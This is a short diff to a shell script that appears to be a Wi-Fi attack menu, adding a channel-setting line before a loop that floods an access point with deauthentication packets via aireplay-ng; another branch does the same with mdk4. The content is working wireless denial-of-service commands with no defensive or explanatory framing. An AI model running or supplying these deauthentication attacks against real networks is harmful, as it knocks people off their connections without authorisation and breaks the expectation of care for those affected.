@@ -23,6 +23,7 @@ if [ "$c" = "1" ]; then
 	iw dev wlan0 set channel $ch
 	mdk4 wlan0 d -B "$b"
 elif [ "$c" = "2" ]; then
+	iw dev wlan0 set channel $ch
 	while true; do
 		aireplay-ng --deauth 0 -a "$b" wlan0
 		if [ $? -ne 0 ]; then
